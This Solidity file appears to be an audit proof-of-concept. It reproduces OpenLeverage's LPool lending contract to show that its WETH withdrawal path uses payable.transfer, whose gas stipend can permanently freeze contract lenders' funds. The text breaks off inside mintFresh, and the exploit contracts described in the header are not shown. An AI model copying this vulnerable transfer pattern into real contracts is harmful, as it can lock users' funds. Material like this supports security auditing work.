// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

// =============================================================================
// AuditVault #42441 — OpenLeverage LPool.doTransferOut uses payable.transfer
// (2300-gas stipend) for WETH-pool withdrawals, permanently freezing the funds
// of any contract lender whose receive path needs more than 2300 gas.
//
// This is a REAL PoC. The vulnerable contract (LPool) and its deploy proxy
// (LPoolDelegator) are the ACTUAL audited OpenLeverage source, copied verbatim
// from github.com/code-423n4/2022-01-openleverage. The exploit deploys them
// through the real Compound-style delegator, has two contract lenders each
// supply 1 ETH into the WETH money market, and shows that the one with an
// ordinary (>2300-gas) receive can NEVER redeem — its 1 ETH stays frozen —
// while the empty-receive control redeems fine.
//
// Only the external permission gate (ControllerInterface) is reduced to its
// five real selectors (it is not where the bug lives), and LPoolDepositor is
// stubbed (the delegated-mint path is unused). WETH is OpenLeverage's own test
// WETH. Everything on the redeem/doTransferOut path is the real audited code.
// =============================================================================

// ----------------------------------------------------------------------------
// OpenZeppelin — IERC20
// ----------------------------------------------------------------------------
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// ----------------------------------------------------------------------------
// OpenZeppelin — SafeMath
// ----------------------------------------------------------------------------
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}

// ----------------------------------------------------------------------------
// OpenZeppelin — ReentrancyGuard
// ----------------------------------------------------------------------------
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;
    constructor () {
        _status = _NOT_ENTERED;
    }
    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

// ----------------------------------------------------------------------------
// OpenLeverage — CarefulMath (verbatim)
// ----------------------------------------------------------------------------
contract CarefulMath {
    enum MathError {
        NO_ERROR,
        DIVISION_BY_ZERO,
        INTEGER_OVERFLOW,
        INTEGER_UNDERFLOW
    }

    function mulUInt(uint a, uint b) internal pure returns (MathError, uint) {
        if (a == 0) {
            return (MathError.NO_ERROR, 0);
        }
        uint c = a * b;
        if (c / a != b) {
            return (MathError.INTEGER_OVERFLOW, 0);
        } else {
            return (MathError.NO_ERROR, c);
        }
    }

    function divUInt(uint a, uint b) internal pure returns (MathError, uint) {
        if (b == 0) {
            return (MathError.DIVISION_BY_ZERO, 0);
        }
        return (MathError.NO_ERROR, a / b);
    }

    function subUInt(uint a, uint b) internal pure returns (MathError, uint) {
        if (b <= a) {
            return (MathError.NO_ERROR, a - b);
        } else {
            return (MathError.INTEGER_UNDERFLOW, 0);
        }
    }

    function addUInt(uint a, uint b) internal pure returns (MathError, uint) {
        uint c = a + b;
        if (c >= a) {
            return (MathError.NO_ERROR, c);
        } else {
            return (MathError.INTEGER_OVERFLOW, 0);
        }
    }

    function addThenSubUInt(uint a, uint b, uint c) internal pure returns (MathError, uint) {
        (MathError err0, uint sum) = addUInt(a, b);
        if (err0 != MathError.NO_ERROR) {
            return (err0, 0);
        }
        return subUInt(sum, c);
    }
}

// ----------------------------------------------------------------------------
// OpenLeverage — Exponential (verbatim; only the members LPool uses are kept
// exactly as in the audited file)
// ----------------------------------------------------------------------------
contract Exponential is CarefulMath {
    uint constant expScale = 1e18;
    uint constant doubleScale = 1e36;
    uint constant halfExpScale = expScale/2;
    uint constant mantissaOne = expScale;

    struct Exp {
        uint mantissa;
    }

    struct Double {
        uint mantissa;
    }

    function getExp(uint num, uint denom) pure internal returns (MathError, Exp memory) {
        (MathError err0, uint scaledNumerator) = mulUInt(num, expScale);
        if (err0 != MathError.NO_ERROR) {
            return (err0, Exp({mantissa: 0}));
        }
        (MathError err1, uint rational) = divUInt(scaledNumerator, denom);
        if (err1 != MathError.NO_ERROR) {
            return (err1, Exp({mantissa: 0}));
        }
        return (MathError.NO_ERROR, Exp({mantissa: rational}));
    }

    function mulScalar(Exp memory a, uint scalar) pure internal returns (MathError, Exp memory) {
        (MathError err0, uint scaledMantissa) = mulUInt(a.mantissa, scalar);
        if (err0 != MathError.NO_ERROR) {
            return (err0, Exp({mantissa: 0}));
        }
        return (MathError.NO_ERROR, Exp({mantissa: scaledMantissa}));
    }

    function mulScalarTruncate(Exp memory a, uint scalar) pure internal returns (MathError, uint) {
        (MathError err, Exp memory product) = mulScalar(a, scalar);
        if (err != MathError.NO_ERROR) {
            return (err, 0);
        }
        return (MathError.NO_ERROR, truncate(product));
    }

    function mulScalarTruncateAddUInt(Exp memory a, uint scalar, uint addend) pure internal returns (MathError, uint) {
        (MathError err, Exp memory product) = mulScalar(a, scalar);
        if (err != MathError.NO_ERROR) {
            return (err, 0);
        }
        return addUInt(truncate(product), addend);
    }

    function divScalarByExp(uint scalar, Exp memory divisor) pure internal returns (MathError, Exp memory) {
        (MathError err0, uint numerator) = mulUInt(expScale, scalar);
        if (err0 != MathError.NO_ERROR) {
            return (err0, Exp({mantissa: 0}));
        }
        return getExp(numerator, divisor.mantissa);
    }

    function divScalarByExpTruncate(uint scalar, Exp memory divisor) pure internal returns (MathError, uint) {
        (MathError err, Exp memory fra) = divScalarByExp(scalar, divisor);
        if (err != MathError.NO_ERROR) {
            return (err, 0);
        }
        return (MathError.NO_ERROR, truncate(fra));
    }

    function truncate(Exp memory exp) pure internal returns (uint) {
        return exp.mantissa / expScale;
    }
}

// ----------------------------------------------------------------------------
// OpenLeverage — TransferHelper (verbatim)
// ----------------------------------------------------------------------------
library TransferHelper {
    function safeTransfer(IERC20 _token, address _to, uint _amount) internal returns (uint amountReceived){
        if (_amount > 0){
            uint balanceBefore = _token.balanceOf(_to);
            address(_token).call(abi.encodeWithSelector(_token.transfer.selector, _to, _amount));
            uint balanceAfter = _token.balanceOf(_to);
            require(balanceAfter > balanceBefore, "TF");
            amountReceived = balanceAfter - balanceBefore;
        }
    }

    function safeTransferFrom(IERC20 _token, address _from, address _to, uint _amount) internal returns (uint amountReceived){
        if (_amount > 0){
            uint balanceBefore = _token.balanceOf(_to);
            address(_token).call(abi.encodeWithSelector(_token.transferFrom.selector, _from, _to, _amount));
            uint balanceAfter = _token.balanceOf(_to);
            require(balanceAfter > balanceBefore, "TFF");
            amountReceived = balanceAfter - balanceBefore;
        }
    }

    function safeApprove(IERC20 _token, address _spender, uint256 _amount) internal returns (uint) {
        bool success;
        if (_token.allowance(address(this), _spender) != 0){
            (success, ) = address(_token).call(abi.encodeWithSelector(_token.approve.selector, _spender, 0));
            require(success, "AF");
        }
        (success, ) = address(_token).call(abi.encodeWithSelector(_token.approve.selector, _spender, _amount));
        require(success, "AF");
        return _token.allowance(address(this), _spender);
    }
}

// ----------------------------------------------------------------------------
// OpenLeverage — Adminable (verbatim)
// ----------------------------------------------------------------------------
abstract contract Adminable {
    address payable public admin;
    address payable public pendingAdmin;
    address payable public developer;

    event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);
    event NewAdmin(address oldAdmin, address newAdmin);

    constructor () {
        developer = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "caller must be admin");
        _;
    }
    modifier onlyAdminOrDeveloper() {
        require(msg.sender == admin || msg.sender == developer, "caller must be admin or developer");
        _;
    }

    function setPendingAdmin(address payable newPendingAdmin) external virtual onlyAdmin {
        address oldPendingAdmin = pendingAdmin;
        pendingAdmin = newPendingAdmin;
        emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin);
    }

    function acceptAdmin() external virtual {
        require(msg.sender == pendingAdmin, "only pendingAdmin can accept admin");
        address oldAdmin = admin;
        address oldPendingAdmin = pendingAdmin;
        admin = pendingAdmin;
        pendingAdmin = address(0);
        emit NewAdmin(oldAdmin, admin);
        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);
    }
}

// ----------------------------------------------------------------------------
// OpenLeverage — DelegateInterface (verbatim)
// ----------------------------------------------------------------------------
contract DelegateInterface {
    address public implementation;
}

// ----------------------------------------------------------------------------
// OpenLeverage — DelegatorInterface (verbatim)
// ----------------------------------------------------------------------------
abstract contract DelegatorInterface {
    address public implementation;
    event NewImplementation(address oldImplementation, address newImplementation);

    function setImplementation(address implementation_) public virtual;

    function delegateTo(address callee, bytes memory data) internal returns (bytes memory) {
        (bool success, bytes memory returnData) = callee.delegatecall(data);
        assembly {
            if eq(success, 0) {revert(add(returnData, 0x20), returndatasize())}
        }
        return returnData;
    }

    function delegateToImplementation(bytes memory data) public returns (bytes memory) {
        return delegateTo(implementation, data);
    }

    function delegateToViewImplementation(bytes memory data) public view returns (bytes memory) {
        (bool success, bytes memory returnData) = address(this).staticcall(abi.encodeWithSignature("delegateToImplementation(bytes)", data));
        assembly {
            if eq(success, 0) {revert(add(returnData, 0x20), returndatasize())}
        }
        return abi.decode(returnData, (bytes));
    }

    fallback() external payable {
        _fallback();
    }

    receive() external payable {
        _fallback();
    }

    function _fallback() internal {
        if (msg.data.length > 0) {
            (bool success,) = implementation.delegatecall(msg.data);
            assembly {
                let free_mem_ptr := mload(0x40)
                returndatacopy(free_mem_ptr, 0, returndatasize())
                switch success
                case 0 {revert(free_mem_ptr, returndatasize())}
                default {return (free_mem_ptr, returndatasize())}
            }
        }
    }
}

// ----------------------------------------------------------------------------
// OpenLeverage — IWETH (verbatim)
// ----------------------------------------------------------------------------
interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

// ----------------------------------------------------------------------------
// ControllerInterface — reduced to the five selectors LPool calls. This is the
// external permission gate, NOT the vulnerable contract; the real ControllerV1
// only checks pause flags / updates reward accounting on these paths.
// ----------------------------------------------------------------------------
interface ControllerInterface {
    function mintAllowed(address minter, uint lTokenAmount) external;
    function transferAllowed(address from, address to, uint lTokenAmount) external;
    function redeemAllowed(address redeemer, uint lTokenAmount) external;
    function borrowAllowed(address borrower, address payee, uint borrowAmount) external;
    function repayBorrowAllowed(address payer, address borrower, uint repayAmount, bool isEnd) external;
}

// ----------------------------------------------------------------------------
// LPoolDepositor — stub. LPool only references it in the delegated-mint branch
// (isDelegete == true), which this PoC never exercises (it uses mintEth).
// ----------------------------------------------------------------------------
contract LPoolDepositor {
    function transferToPool(address from, uint amount) external {}
}

// ----------------------------------------------------------------------------
// OpenLeverage — LPoolInterface / LPoolStorage (verbatim)
// ----------------------------------------------------------------------------
abstract contract LPoolStorage {
    bool internal _notEntered;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;

    mapping(address => uint) internal accountTokens;
    mapping(address => mapping(address => uint)) internal transferAllowances;

    uint internal constant borrowRateMaxMantissa = 0.0005e16;
    uint public  borrowCapFactorMantissa;
    address public controller;

    uint internal initialExchangeRateMantissa;
    uint public accrualBlockNumber;
    uint public borrowIndex;
    uint public totalBorrows;
    uint internal totalCash;
    uint public reserveFactorMantissa;
    uint public totalReserves;
    address public underlying;
    bool public isWethPool;

    struct BorrowSnapshot {
        uint principal;
        uint interestIndex;
    }

    uint256 public baseRatePerBlock;
    uint256 public multiplierPerBlock;
    uint256 public jumpMultiplierPerBlock;
    uint256 public kink;

    mapping(address => BorrowSnapshot) internal accountBorrows;

    event Mint(address minter, uint mintAmount, uint mintTokens);
    event Transfer(address indexed from, address indexed to, uint amount);
    event Approval(address indexed owner, address indexed spender, uint amount);
    event AccrueInterest(uint cashPrior, uint interestAccumulated, uint borrowIndex, uint totalBorrows);
    event Redeem(address redeemer, uint redeemAmount, uint redeemTokens);
    event Borrow(address borrower, address payee, uint borrowAmount, uint accountBorrows, uint totalBorrows);
    event RepayBorrow(address payer, address borrower, uint repayAmount, uint badDebtsAmount, uint accountBorrows, uint totalBorrows);
    event NewController(address oldController, address newController);
    event NewInterestParam(uint baseRatePerBlock, uint multiplierPerBlock, uint jumpMultiplierPerBlock, uint kink);
    event NewReserveFactor(uint oldReserveFactorMantissa, uint newReserveFactorMantissa);
    event ReservesAdded(address benefactor, uint addAmount, uint newTotalReserves);
    event ReservesReduced(address to, uint reduceAmount, uint newTotalReserves);
    event NewBorrowCapFactorMantissa(uint oldBorrowCapFactorMantissa, uint newBorrowCapFactorMantissa);
}

abstract contract LPoolInterface is LPoolStorage {
    function transfer(address dst, uint amount) external virtual returns (bool);
    function transferFrom(address src, address dst, uint amount) external virtual returns (bool);
    function approve(address spender, uint amount) external virtual returns (bool);
    function allowance(address owner, address spender) external virtual view returns (uint);
    function balanceOf(address owner) external virtual view returns (uint);
    function balanceOfUnderlying(address owner) external virtual returns (uint);
    function mint(uint mintAmount) external virtual;
    function mintTo(address to, uint amount) external payable virtual;
    function mintEth() external payable virtual;
    function redeem(uint redeemTokens) external virtual;
    function redeemUnderlying(uint redeemAmount) external virtual;
    function borrowBehalf(address borrower, uint borrowAmount) external virtual;
    function repayBorrowBehalf(address borrower, uint repayAmount) external virtual;
    function repayBorrowEndByOpenLev(address borrower, uint repayAmount) external virtual;
    function availableForBorrow() external view virtual returns (uint);
    function getAccountSnapshot(address account) external virtual view returns (uint, uint, uint);
    function borrowRatePerBlock() external virtual view returns (uint);
    function supplyRatePerBlock() external virtual view returns (uint);
    function totalBorrowsCurrent() external virtual view returns (uint);
    function borrowBalanceCurrent(address account) external virtual view returns (uint);
    function borrowBalanceStored(address account) external virtual view returns (uint);
    function exchangeRateCurrent() public virtual returns (uint);
    function exchangeRateStored() public virtual view returns (uint);
    function getCash() external view virtual returns (uint);
    function accrueInterest() public virtual;
    function setController(address newController) external virtual;
    function setBorrowCapFactorMantissa(uint newBorrowCapFactorMantissa) external virtual;
    function setInterestParams(uint baseRatePerBlock_, uint multiplierPerBlock_, uint jumpMultiplierPerBlock_, uint kink_) external virtual;
    function setReserveFactor(uint newReserveFactorMantissa) external virtual;
    function addReserves(uint addAmount) external virtual;
    function reduceReserves(address payable to, uint reduceAmount) external virtual;
}

// ----------------------------------------------------------------------------
// OpenLeverage — LPool (VERBATIM audited source; the vulnerable doTransferOut
// is unchanged: for a WETH pool it unwraps WETH then `to.transfer(amount)`).
// ----------------------------------------------------------------------------
contract LPool is DelegateInterface, Adminable, LPoolInterface, Exponential, ReentrancyGuard {
    using TransferHelper for IERC20;
    using SafeMath for uint;

    constructor() {

    }

    function initialize(
        address underlying_,
        bool isWethPool_,
        address controller_,
        uint256 baseRatePerBlock_,
        uint256 multiplierPerBlock_,
        uint256 jumpMultiplierPerBlock_,
        uint256 kink_,
        uint initialExchangeRateMantissa_,
        string memory name_,
        string memory symbol_,
        uint8 decimals_) public {
        require(underlying_ != address(0), "underlying_ address cannot be 0");
        require(controller_ != address(0), "controller_ address cannot be 0");
        require(msg.sender == admin, "Only allow to be called by admin");
        require(accrualBlockNumber == 0 && borrowIndex == 0, "inited once");

        initialExchangeRateMantissa = initialExchangeRateMantissa_;
        require(initialExchangeRateMantissa > 0, "Initial Exchange Rate Mantissa should be greater zero");
        controller = controller_;
        isWethPool = isWethPool_;
        baseRatePerBlock = baseRatePerBlock_;
        multiplierPerBlock = multiplierPerBlock_;
        jumpMultiplierPerBlock = jumpMultiplierPerBlock_;
        kink = kink_;

        accrualBlockNumber = getBlockNumber();
        borrowIndex = 1e25;
        borrowCapFactorMantissa = 0.8e18;
        reserveFactorMantissa = 0.1e18;

        name = name_;
        symbol = symbol_;
        decimals = decimals_;

        _notEntered = true;

        underlying = underlying_;
        IERC20(underlying).totalSupply();
        emit Transfer(address(0), msg.sender, 0);
    }

    function transferTokens(address spender, address src, address dst, uint tokens) internal returns (bool) {
        require(dst != address(0), "dst address cannot be 0");
        require(src != dst, "src = dst");
        (ControllerInterface(controller)).transferAllowed(src, dst, tokens);

        uint startingAllowance = 0;
        if (spender == src) {
            startingAllowance = uint(- 1);
        } else {
            startingAllowance = transferAllowances[src][spender];
        }

        MathError mathErr;
        uint allowanceNew;
        uint srcTokensNew;
        uint dstTokensNew;

        (mathErr, allowanceNew) = subUInt(startingAllowance, tokens);
        require(mathErr == MathError.NO_ERROR, 'not allowed');

        (mathErr, srcTokensNew) = subUInt(accountTokens[src], tokens);
        require(mathErr == MathError.NO_ERROR, 'not enough');

        (mathErr, dstTokensNew) = addUInt(accountTokens[dst], tokens);
        require(mathErr == MathError.NO_ERROR, 'too much');

        accountTokens[src] = srcTokensNew;
        accountTokens[dst] = dstTokensNew;

        if (startingAllowance != uint(- 1)) {
            transferAllowances[src][spender] = allowanceNew;
        }
        emit Transfer(src, dst, tokens);
        return true;
    }

    function transfer(address dst, uint256 amount) external override nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount);
    }

    function transferFrom(address src, address dst, uint256 amount) external override nonReentrant returns (bool) {
        return transferTokens(msg.sender, src, dst, amount);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        address src = msg.sender;
        transferAllowances[src][spender] = amount;
        emit Approval(src, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) external override view returns (uint256) {
        return transferAllowances[owner][spender];
    }

    function balanceOf(address owner) external override view returns (uint256) {
        return accountTokens[owner];
    }

    function balanceOfUnderlying(address owner) external override returns (uint) {
        Exp memory exchangeRate = Exp({mantissa : exchangeRateCurrent()});
        (MathError mErr, uint balance) = mulScalarTruncate(exchangeRate, accountTokens[owner]);
        require(mErr == MathError.NO_ERROR, "calc failed");
        return balance;
    }

    function mint(uint mintAmount) external override nonReentrant {
        accrueInterest();
        mintFresh(msg.sender, mintAmount, false);
    }

    function mintTo(address to, uint amount) external payable override nonReentrant {
        accrueInterest();
        if (isWethPool) {
            mintFresh(to, msg.value, false);
        } else {
            mintFresh(to, amount, true);
        }
    }

    function mintEth() external payable override nonReentrant {
        require(isWethPool, "not eth pool");
        accrueInterest();
        mintFresh(msg.sender, msg.value, false);
    }

    function redeem(uint redeemTokens) external override nonReentrant {
        accrueInterest();
        redeemFresh(msg.sender, redeemTokens, 0);
    }

    function redeemUnderlying(uint redeemAmount) external override nonReentrant {
        accrueInterest();
        redeemFresh(msg.sender, 0, redeemAmount);
    }

    function borrowBehalf(address borrower, uint borrowAmount) external override nonReentrant {
        accrueInterest();
        borrowFresh(payable(borrower), msg.sender, borrowAmount);
    }

    function repayBorrowBehalf(address borrower, uint repayAmount) external override nonReentrant {
        accrueInterest();
        repayBorrowFresh(msg.sender, borrower, repayAmount, false);
    }

    function repayBorrowEndByOpenLev(address borrower, uint repayAmount) external override nonReentrant {
        accrueInterest();
        repayBorrowFresh(msg.sender, borrower, repayAmount, true);
    }

    function getCashPrior() internal view returns (uint) {
        return IERC20(underlying).balanceOf(address(this));
    }

    function doTransferIn(address from, uint amount, bool convertWeth) internal returns (uint actualAmount) {
        if (isWethPool && convertWeth) {
            actualAmount = msg.value;
            IWETH(underlying).deposit{value : actualAmount}();
        } else {
            actualAmount = IERC20(underlying).safeTransferFrom(from, address(this), amount);
        }
    }

    function doTransferOut(address payable to, uint amount, bool convertWeth) internal {
        if (isWethPool && convertWeth) {
            IWETH(underlying).withdraw(amount);
            to.transfer(amount);
        } else {
            IERC20(underlying).safeTransfer(to, amount);
        }
    }

    function availableForBorrow() external view override returns (uint){
        uint cash = getCashPrior();
        (MathError err0, uint sum) = addThenSubUInt(cash, totalBorrows, totalReserves);
        if (err0 != MathError.NO_ERROR) {
            return 0;
        }
        (MathError err1, uint maxAvailable) = mulScalarTruncate(Exp({mantissa : sum}), borrowCapFactorMantissa);
        if (err1 != MathError.NO_ERROR) {
            return 0;
        }
        if (totalBorrows > maxAvailable) {
            return 0;
        }
        return maxAvailable - totalBorrows;
    }

    function getAccountSnapshot(address account) external override view returns (uint, uint, uint) {
        uint cTokenBalance = accountTokens[account];
        uint borrowBalance;
        uint exchangeRateMantissa;

        MathError mErr;

        (mErr, borrowBalance) = borrowBalanceStoredInternal(account);
        if (mErr != MathError.NO_ERROR) {
            return (0, 0, 0);
        }

        (mErr, exchangeRateMantissa) = exchangeRateStoredInternal();
        if (mErr != MathError.NO_ERROR) {
            return (0, 0, 0);
        }

        return (cTokenBalance, borrowBalance, exchangeRateMantissa);
    }

    function getBlockNumber() internal view returns (uint) {
        return block.number;
    }

    function borrowRatePerBlock() external override view returns (uint) {
        return getBorrowRateInternal(getCashPrior(), totalBorrows, totalReserves);
    }

    function supplyRatePerBlock() external override view returns (uint) {
        return getSupplyRateInternal(getCashPrior(), totalBorrows, totalReserves, reserveFactorMantissa);
    }

    function utilizationRate(uint cash, uint borrows, uint reserves) internal pure returns (uint) {
        if (borrows == 0) {
            return 0;
        }
        return borrows.mul(1e18).div(cash.add(borrows).sub(reserves));
    }

    function getBorrowRateInternal(uint cash, uint borrows, uint reserves) internal view returns (uint) {
        uint util = utilizationRate(cash, borrows, reserves);
        if (util <= kink) {
            return util.mul(multiplierPerBlock).div(1e18).add(baseRatePerBlock);
        } else {
            uint normalRate = kink.mul(multiplierPerBlock).div(1e18).add(baseRatePerBlock);
            uint excessUtil = util.sub(kink);
            return excessUtil.mul(jumpMultiplierPerBlock).div(1e18).add(normalRate);
        }
    }

    function getSupplyRateInternal(uint cash, uint borrows, uint reserves, uint reserveFactor) internal view returns (uint) {
        uint oneMinusReserveFactor = uint(1e18).sub(reserveFactor);
        uint borrowRate = getBorrowRateInternal(cash, borrows, reserves);
        uint rateToPool = borrowRate.mul(oneMinusReserveFactor).div(1e18);
        return utilizationRate(cash, borrows, reserves).mul(rateToPool).div(1e18);
    }

    function totalBorrowsCurrent() external override view returns (uint) {
        uint currentBlockNumber = getBlockNumber();
        uint accrualBlockNumberPrior = accrualBlockNumber;

        if (accrualBlockNumberPrior == currentBlockNumber) {
            return totalBorrows;
        }

        uint cashPrior = getCashPrior();
        uint borrowsPrior = totalBorrows;
        uint reservesPrior = totalReserves;

        uint borrowRateMantissa = getBorrowRateInternal(cashPrior, borrowsPrior, reservesPrior);
        require(borrowRateMantissa <= borrowRateMaxMantissa, "borrower rate higher");

        (MathError mathErr, uint blockDelta) = subUInt(currentBlockNumber, accrualBlockNumberPrior);
        require(mathErr == MathError.NO_ERROR, "calc block delta erro");

        Exp memory simpleInterestFactor;
        uint interestAccumulated;
        uint totalBorrowsNew;

        (mathErr, simpleInterestFactor) = mulScalar(Exp({mantissa : borrowRateMantissa}), blockDelta);
        require(mathErr == MathError.NO_ERROR, 'calc interest factor error');

        (mathErr, interestAccumulated) = mulScalarTruncate(simpleInterestFactor, borrowsPrior);
        require(mathErr == MathError.NO_ERROR, 'calc interest acc error');

        (mathErr, totalBorrowsNew) = addUInt(interestAccumulated, borrowsPrior);
        require(mathErr == MathError.NO_ERROR, 'calc total borrows error');

        return totalBorrowsNew;
    }

    function borrowBalanceCurrent(address account) external view override returns (uint) {
        (MathError err0, uint borrowIndex_) = calCurrentBorrowIndex();
        require(err0 == MathError.NO_ERROR, "calc borrow index fail");
        (MathError err1, uint result) = borrowBalanceStoredInternalWithBorrowerIndex(account, borrowIndex_);
        require(err1 == MathError.NO_ERROR, "calc fail");
        return result;
    }

    function borrowBalanceStored(address account) external override view returns (uint){
        return accountBorrows[account].principal;
    }

    function borrowBalanceStoredInternal(address account) internal view returns (MathError, uint) {
        return borrowBalanceStoredInternalWithBorrowerIndex(account, borrowIndex);
    }

    function borrowBalanceStoredInternalWithBorrowerIndex(address account, uint borrowIndex_) internal view returns (MathError, uint) {
        MathError mathErr;
        uint principalTimesIndex;
        uint result;

        BorrowSnapshot storage borrowSnapshot = accountBorrows[account];

        if (borrowSnapshot.principal == 0) {
            return (MathError.NO_ERROR, 0);
        }

        (mathErr, principalTimesIndex) = mulUInt(borrowSnapshot.principal, borrowIndex_);
        if (mathErr != MathError.NO_ERROR) {
            return (mathErr, 0);
        }

        (mathErr, result) = divUInt(principalTimesIndex, borrowSnapshot.interestIndex);
        if (mathErr != MathError.NO_ERROR) {
            return (mathErr, 0);
        }

        return (MathError.NO_ERROR, result);
    }

    function exchangeRateCurrent() public override nonReentrant returns (uint) {
        accrueInterest();
        return exchangeRateStored();
    }

    function exchangeRateStored() public override view returns (uint) {
        (MathError err, uint result) = exchangeRateStoredInternal();
        require(err == MathError.NO_ERROR, "calc fail");
        return result;
    }

    function exchangeRateStoredInternal() internal view returns (MathError, uint) {
        uint _totalSupply = totalSupply;
        if (_totalSupply == 0) {
            return (MathError.NO_ERROR, initialExchangeRateMantissa);
        } else {
            uint _totalCash = getCashPrior();
            uint cashPlusBorrowsMinusReserves;
            Exp memory exchangeRate;
            MathError mathErr;

            (mathErr, cashPlusBorrowsMinusReserves) = addThenSubUInt(_totalCash, totalBorrows, totalReserves);
            if (mathErr != MathError.NO_ERROR) {
                return (mathErr, 0);
            }

            (mathErr, exchangeRate) = getExp(cashPlusBorrowsMinusReserves, _totalSupply);
            if (mathErr != MathError.NO_ERROR) {
                return (mathErr, 0);
            }

            return (MathError.NO_ERROR, exchangeRate.mantissa);
        }
    }

    function getCash() external override view returns (uint) {
        return IERC20(underlying).balanceOf(address(this));
    }

    function calCurrentBorrowIndex() internal view returns (MathError, uint) {
        uint currentBlockNumber = getBlockNumber();
        uint accrualBlockNumberPrior = accrualBlockNumber;
        uint borrowIndexNew;
        if (accrualBlockNumberPrior == currentBlockNumber) {
            return (MathError.NO_ERROR, borrowIndex);
        }
        uint borrowRateMantissa = getBorrowRateInternal(getCashPrior(), totalBorrows, totalReserves);
        (MathError mathErr, uint blockDelta) = subUInt(currentBlockNumber, accrualBlockNumberPrior);

        Exp memory simpleInterestFactor;
        (mathErr, simpleInterestFactor) = mulScalar(Exp({mantissa : borrowRateMantissa}), blockDelta);
        if (mathErr != MathError.NO_ERROR) {
            return (mathErr, 0);
        }
        (mathErr, borrowIndexNew) = mulScalarTruncateAddUInt(simpleInterestFactor, borrowIndex, borrowIndex);
        return (mathErr, borrowIndexNew);
    }

    function accrueInterest() public override {
        uint currentBlockNumber = getBlockNumber();
        uint accrualBlockNumberPrior = accrualBlockNumber;

        if (accrualBlockNumberPrior == currentBlockNumber) {
            return;
        }

        uint cashPrior = getCashPrior();
        uint borrowsPrior = totalBorrows;
        uint borrowIndexPrior = borrowIndex;
        uint reservesPrior = totalReserves;

        uint borrowRateMantissa = getBorrowRateInternal(cashPrior, borrowsPrior, reservesPrior);
        require(borrowRateMantissa <= borrowRateMaxMantissa, "borrower rate higher");

        (MathError mathErr, uint blockDelta) = subUInt(currentBlockNumber, accrualBlockNumberPrior);
        require(mathErr == MathError.NO_ERROR, "calc block delta erro");

        Exp memory simpleInterestFactor;
        uint interestAccumulated;
        uint totalBorrowsNew;
        uint borrowIndexNew;
        uint totalReservesNew;

        (mathErr, simpleInterestFactor) = mulScalar(Exp({mantissa : borrowRateMantissa}), blockDelta);
        require(mathErr == MathError.NO_ERROR, 'calc interest factor error');

        (mathErr, interestAccumulated) = mulScalarTruncate(simpleInterestFactor, borrowsPrior);
        require(mathErr == MathError.NO_ERROR, 'calc interest acc error');

        (mathErr, totalBorrowsNew) = addUInt(interestAccumulated, borrowsPrior);
        require(mathErr == MathError.NO_ERROR, 'calc total borrows error');

        (mathErr, totalReservesNew) = mulScalarTruncateAddUInt(Exp({mantissa : reserveFactorMantissa}), interestAccumulated, reservesPrior);
        require(mathErr == MathError.NO_ERROR, 'calc total reserves error');

        (mathErr, borrowIndexNew) = mulScalarTruncateAddUInt(simpleInterestFactor, borrowIndexPrior, borrowIndexPrior);
        require(mathErr == MathError.NO_ERROR, 'calc borrows index error');

        accrualBlockNumber = currentBlockNumber;
        borrowIndex = borrowIndexNew;
        totalBorrows = totalBorrowsNew;
        totalReserves = totalReservesNew;

        emit AccrueInterest(cashPrior, interestAccumulated, borrowIndexNew, totalBorrowsNew);
    }

    struct MintLocalVars {
        MathError mathErr;
        uint exchangeRateMantissa;
        uint mintTokens;
        uint totalSupplyNew;
        uint accountTokensNew;
        uint actualMintAmount;
    }

    function mintFresh(address minter, uint mintAmount, bool isDelegete) internal sameBlock returns (uint) {
        MintLocalVars memory vars;
        (vars.mathErr, vars.exchangeRateMantissa) = exchangeRateStoredInternal();
        require(vars.mathErr == MathError.NO_ERROR, 'calc exchangerate error');

        if (isDelegete) {
            uint balanceBefore = getCashPrior();
            LPoolDepositor(msg.sender).transferToPool(minter, mintAmount);
            uint balanceAfter = getCashPrior();
            require(balanceAfter > balanceBefore, 'mint 0');
            vars.actualMintAmount = balanceAfter - balanceBefore;
        } else {
            vars.actualMintAmount = doTransferIn(minter, mintAmount, true);
        }

        (vars.mathErr, vars.mintTokens) = divScalarByExpTruncate(vars.actualMintAmount, Exp({mantissa : vars.exchangeRateMantissa}));
        require(vars.mathErr == MathError.NO_ERROR, "calc mint token error");

        (ControllerInterface(controller)).mintAllowed(minter, vars.mintTokens);

        (vars.mathErr, vars.totalSupplyNew) = addUInt(totalSupply, vars.mintTokens);
        require(vars.mathErr == MathError.NO_ERROR, "calc supply new failed");

